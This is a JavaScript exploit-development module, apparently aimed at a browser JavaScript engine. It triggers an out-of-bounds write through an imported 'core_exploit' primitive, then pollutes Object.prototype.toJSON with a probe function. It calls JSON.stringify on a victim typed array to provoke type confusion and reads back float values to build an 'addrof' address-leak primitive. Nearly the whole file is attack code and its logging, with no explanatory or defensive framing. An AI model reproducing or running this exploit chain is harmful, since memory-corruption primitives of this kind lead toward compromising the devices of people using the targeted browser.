// js/script3/testArrayBufferVictimCrash.mjs (v_typedArray_addrof_v4_PreConfuse_DebugLogVerify)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V4_PC_DV = "OriginalHeisenbug_TypedArrayAddrof_v4_PreConfuse_DebugLogVerify"; // PC_DV

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const LOCAL_HEISENBUG_CRITICAL_WRITE_VALUE = 0xFFFFFFFF;

let last_probe_call_details_v4pc_dv = null; // pc_dv
let object_to_leak_A_v4pc_dv = null;
let object_to_leak_B_v4pc_dv = null;
let victim_typed_array_ref_v4pc_dv = null;

function toJSON_TA_Probe_PreConfuse_DebugLogVerify() {
    let current_call_details = {
        probe_variant: "TA_Probe_Addrof_v4_PreConfuse_DebugLogVerify",
        this_type_in_toJSON: "N/A_before_call",
        error_in_toJSON: null,
        probe_called: true,
        this_was_victim_ref_at_confusion: null,
        writes_attempted_in_probe: false
    };

    try {
        current_call_details.this_type_in_toJSON = Object.prototype.toString.call(this);
        logS3(`[${current_call_details.probe_variant}] Probe Invoked. 'this' type: ${current_call_details.this_type_in_toJSON}. 'this' === victim_typed_array_ref_v4pc_dv? ${this === victim_typed_array_ref_v4pc_dv}`, "leak");

        if (current_call_details.this_type_in_toJSON === '[object Object]') {
            logS3(`[${current_call_details.probe_variant}] TYPE CONFUSION DETECTED for 'this' (now [object Object])!`, "vuln");
            current_call_details.this_was_victim_ref_at_confusion = (this === victim_typed_array_ref_v4pc_dv);
            logS3(`[${current_call_details.probe_variant}] At confusion, 'this' === victim_typed_array_ref_v4pc_dv? ${current_call_details.this_was_victim_ref_at_confusion}`, "info");
            
            // Reativando escritas na sonda
            logS3(`[${current_call_details.probe_variant}] Attempting addrof writes IN PROBE on the confused 'this' ([object Object])...`, "warn");
            if (object_to_leak_A_v4pc_dv) { 
                this[0] = object_to_leak_A_v4pc_dv; 
                logS3(`[${current_call_details.probe_variant}] Wrote object_to_leak_A_v4pc_dv to this[0] in probe.`, "info");
            }
            if (object_to_leak_B_v4pc_dv) { 
                this[1] = object_to_leak_B_v4pc_dv; 
                logS3(`[${current_call_details.probe_variant}] Wrote object_to_leak_B_v4pc_dv to this[1] in probe.`, "info");
            }
            current_call_details.writes_attempted_in_probe = true;

        } else if (this === victim_typed_array_ref_v4pc_dv) {
            logS3(`[${current_call_details.probe_variant}] 'this' is victim_typed_array_ref_v4pc_dv, type is ${current_call_details.this_type_in_toJSON}. No confusion yet for this 'this'.`, "info");
        } else {
            logS3(`[${current_call_details.probe_variant}] 'this' (type: ${current_call_details.this_type_in_toJSON}) is not victim_typed_array_ref_v4pc_dv. No action.`, "warn");
        }
    } catch (e) {
        current_call_details.error_in_toJSON = `${e.name}: ${e.message}`;
        logS3(`[${current_call_details.probe_variant}] ERROR in probe: ${e.name} - ${e.message}`, "error");
    }
    
    logS3(`[${current_call_details.probe_variant}] Probe FINISHING. Current_call_details (before assigning to global): ${JSON.stringify(current_call_details)}`, "dev_verbose");
    last_probe_call_details_v4pc_dv = { ...current_call_details };
    logS3(`[${current_call_details.probe_variant}] Global 'last_probe_call_details_v4pc_dv' UPDATED: ${JSON.stringify(last_probe_call_details_v4pc_dv)}`, "dev_verbose");

    return { minimal_probe_v4pc_dv_did_execute: true }; 
}

export async function executeTypedArrayVictimAddrofTest_PreConfuse_DebugLogVerify() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V4_PC_DV}.triggerAndAddrof`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST}: Heisenbug (TypedArray, PreConfuse_DebugLogVerify) & Addrof Attempt ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V4_PC_DV} Init...`;

    last_probe_call_details_v4pc_dv = null;
    victim_typed_array_ref_v4pc_dv = null;
    object_to_leak_A_v4pc_dv = { marker: "ObjA_TA_v4pcdv", id: Date.now() }; 
    object_to_leak_B_v4pc_dv = { marker: "ObjB_TA_v4pcdv", id: Date.now() + 123 };

    let errorCapturedMain = null;
    let stringifyOutput = null;
    let captured_probe_details_after_stringify = null;
    
    let addrof_result_A = { success: false, leaked_address_as_double: null, leaked_address_as_int64: null, message: "Addrof A @ view[0]: Not attempted or failed." };
    let addrof_result_B = { success: false, leaked_address_as_double: null, leaked_address_as_int64: null, message: "Addrof B @ view[1]: Not attempted or failed." };
    
    const fillPattern = 0.77889900112233; // Mantendo o mesmo da v4 PreConfuse

    try {
        await triggerOOB_primitive({ force_reinit: true });
        // ... (OOB init logs)

        logS3(`STEP 1: Writing CRITICAL value ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_VALUE)} to oob_array_buffer_real[${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)}]...`, "warn", FNAME_CURRENT_TEST);
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, LOCAL_HEISENBUG_CRITICAL_WRITE_VALUE, 4);
        logS3(`  Critical OOB write to ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)} performed.`, "info", FNAME_CURRENT_TEST);
        
        await PAUSE_S3(100);

        victim_typed_array_ref_v4pc_dv = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE));
        let float64_view_on_underlying_ab = new Float64Array(victim_typed_array_ref_v4pc_dv.buffer);
        
        for(let i = 0; i < float64_view_on_underlying_ab.length; i++) {
            float64_view_on_underlying_ab[i] = fillPattern + i;
        }
        logS3(`STEP 1.5: victim_typed_array_ref_v4pc_dv created. View filled with ${float64_view_on_underlying_ab[0]}.`, "test", FNAME_CURRENT_TEST);

        logS3(`STEP 1.6: Attempting pre-stringify writes to victim_typed_array_ref_v4pc_dv[0] and [1]...`, "warn", FNAME_CURRENT_TEST);
        try {
            victim_typed_array_ref_v4pc_dv[0] = object_to_leak_A_v4pc_dv; 
            victim_typed_array_ref_v4pc_dv[1] = object_to_leak_B_v4pc_dv;
            logS3(`  Pre-stringify writes to victim_typed_array_ref_v4pc_dv[0],[1] supposedly done.`, "info");
        } catch (e_pre_assign) {
            logS3(`  ERROR during pre-stringify assignment: ${e_pre_assign.name} - ${e_pre_assign.message}`, "error");
        }
        
        logS3(`STEP 2: Attempting JSON.stringify on victim_typed_array_ref_v4pc_dv with ${toJSON_TA_Probe_PreConfuse_DebugLogVerify.name}...`, "test", FNAME_CURRENT_TEST);
        
        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, {
                value: toJSON_TA_Probe_PreConfuse_DebugLogVerify,
                writable: true, configurable: true, enumerable: false
            });
            pollutionApplied = true;
            logS3(`  Object.prototype.${ppKey} polluted.`, "info", FNAME_CURRENT_TEST);

            logS3(`  Calling JSON.stringify(victim_typed_array_ref_v4pc_dv)...`, "warn", FNAME_CURRENT_TEST);
            stringifyOutput = JSON.stringify(victim_typed_array_ref_v4pc_dv); 
            
            logS3(`  JSON.stringify completed. Stringify Output: ${stringifyOutput ? JSON.stringify(stringifyOutput) : 'N/A'}`, "info", FNAME_CURRENT_TEST);
            
            // DEBUG LOGGING for last_probe_call_details_v4pc_dv
            logS3(`  DEBUG LOG 1: Global 'last_probe_call_details_v4pc_dv' (AFTER stringify, BEFORE copy): ${last_probe_call_details_v4pc_dv ? JSON.stringify(last_probe_call_details_v4pc_dv) : 'null'}`, "dev_critical");

            if (last_probe_call_details_v4pc_dv) {
                captured_probe_details_after_stringify = { ...last_probe_call_details_v4pc_dv }; 
            }
            logS3(`  DEBUG LOG 2: Copied 'captured_probe_details_after_stringify': ${captured_probe_details_after_stringify ? JSON.stringify(captured_probe_details_after_stringify) : 'N/A'}`, "dev_critical");

            if (captured_probe_details_after_stringify && 
                captured_probe_details_after_stringify.probe_called && 
                captured_probe_details_after_stringify.this_type_in_toJSON === "[object Object]") {
                logS3(`  HEISENBUG CONFIRMED (via captured last probe details)! 'this' type in last probe: ${captured_probe_details_after_stringify.this_type_in_toJSON}`, "vuln", FNAME_CURRENT_TEST);
                logS3(`    Last confused probe: 'this' === victim? ${captured_probe_details_after_stringify.this_was_victim_ref_at_confusion}. Writes attempted in probe? ${captured_probe_details_after_stringify.writes_attempted_in_probe}`, "info");
            } else if (captured_probe_details_after_stringify) {
                 logS3(`  Heisenbug NOT confirmed by captured details. Last probe 'this' type: ${captured_probe_details_after_stringify.this_type_in_toJSON}`, "warn", FNAME_CURRENT_TEST);
            } else {
                logS3(`  ALERT: Captured probe details are null. Heisenbug status unknown.`, "error", FNAME_CURRENT_TEST);
            }
                
            logS3("STEP 3: Checking float64_view_on_underlying_ab for addrof results...", "warn", FNAME_CURRENT_TEST);

            const val_A_double = float64_view_on_underlying_ab[0];
            addrof_result_A.leaked_address_as_double = val_A_double;
            let temp_buf_A = new ArrayBuffer(8); new Float64Array(temp_buf_A)[0] = val_A_double;
            addrof_result_A.leaked_address_as_int64 = new AdvancedInt64(new Uint32Array(temp_buf_A)[0], new Uint32Array(temp_buf_A)[1]);
            logS3(`  Value from view[0] (ObjA): ${val_A_double} (${addrof_result_A.leaked_address_as_int64.toString(true)})`, "leak", FNAME_CURRENT_TEST);

            if (val_A_double !== (fillPattern + 0) && val_A_double !== 0 &&
                (addrof_result_A.leaked_address_as_int64.high() < 0x00020000 || (addrof_result_A.leaked_address_as_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                logS3("  !!!! POTENTIAL POINTER at view[0] (ObjA) !!!!", "vuln", FNAME_CURRENT_TEST);
                addrof_result_A.success = true;
                addrof_result_A.message = "Possible pointer for ObjA at view[0].";
            } else {
                addrof_result_A.message = "view[0] does not appear to be a pointer for ObjA.";
                if (val_A_double === (fillPattern + 0)) addrof_result_A.message += " (Value is initial fillPattern)";
            }

            // ... (ObjB logic similar)
            const val_B_double = float64_view_on_underlying_ab[1];
            addrof_result_B.leaked_address_as_double = val_B_double;
            let temp_buf_B = new ArrayBuffer(8); new Float64Array(temp_buf_B)[0] = val_B_double;
            addrof_result_B.leaked_address_as_int64 = new AdvancedInt64(new Uint32Array(temp_buf_B)[0], new Uint32Array(temp_buf_B)[1]);
            logS3(`  Value from view[1] (ObjB): ${val_B_double} (${addrof_result_B.leaked_address_as_int64.toString(true)})`, "leak", FNAME_CURRENT_TEST);
            
            if (val_B_double !== (fillPattern + 1) && val_B_double !== 0 &&
                (addrof_result_B.leaked_address_as_int64.high() < 0x00020000 || (addrof_result_B.leaked_address_as_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                logS3("  !!!! POTENTIAL POINTER at view[1] (ObjB) !!!!", "vuln", FNAME_CURRENT_TEST);
                addrof_result_B.success = true;
                addrof_result_B.message = "Possible pointer for ObjB at view[1].";
            } else {
                addrof_result_B.message = "view[1] does not appear to be a pointer for ObjB.";
                if (val_B_double === (fillPattern + 1)) addrof_result_B.message += " (Value is initial fillPattern)";
            }


            if (addrof_result_A.success || addrof_result_B.success) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V4_PC_DV}: Addr? SUCCESS!`;
            } else {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V4_PC_DV}: Addr Failed (PreConf-DV)`;
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
             logS3(`    CRITICAL ERROR during JSON.stringify or addrof logic: ${e_str.name} - ${e_str.message}${e_str.stack ? '\n'+e_str.stack : ''}`, "critical", FNAME_CURRENT_TEST);
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V4_PC_DV}: Stringify/Addrof ERR`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
                else delete Object.prototype[ppKey];
                logS3(`  Object.prototype.${ppKey} restored.`, "info", FNAME_CURRENT_TEST);
            }
        }

    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        logS3(`ERRO CRÍTICO GERAL no teste: ${e_outer_main.name} - ${e_outer_main.message}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V4_PC_DV} FALHOU CRITICAMENTE`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
        // ... (logs de resultado final)
        logS3(`Addrof A Result (view[0]): Success=${addrof_result_A.success}, Msg='${addrof_result_A.message}'`, addrof_result_A.success ? "good" : "warn", FNAME_CURRENT_TEST);
        if(addrof_result_A.leaked_address_as_int64){
            logS3(`  Addrof A (Int64): ${addrof_result_A.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);
        }
        logS3(`Addrof B Result (view[1]): Success=${addrof_result_B.success}, Msg='${addrof_result_B.message}'`, addrof_result_B.success ? "good" : "warn", FNAME_CURRENT_TEST);
        if(addrof_result_B.leaked_address_as_int64){
            logS3(`  Addrof B (Int64): ${addrof_result_B.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);
        }
        
        object_to_leak_A_v4pc_dv = null;
        object_to_leak_B_v4pc_dv = null;
        victim_typed_array_ref_v4pc_dv = null;
        last_probe_call_details_v4pc_dv = null; 
    }
    return { 
        errorOccurred: errorCapturedMain, 
        potentiallyCrashed: false, 
        stringifyResult: stringifyOutput, 
        toJSON_details: captured_probe_details_after_stringify, 
        addrof_A_attempt_result: addrof_result_A,
        addrof_B_attempt_result: addrof_result_B
    };
}
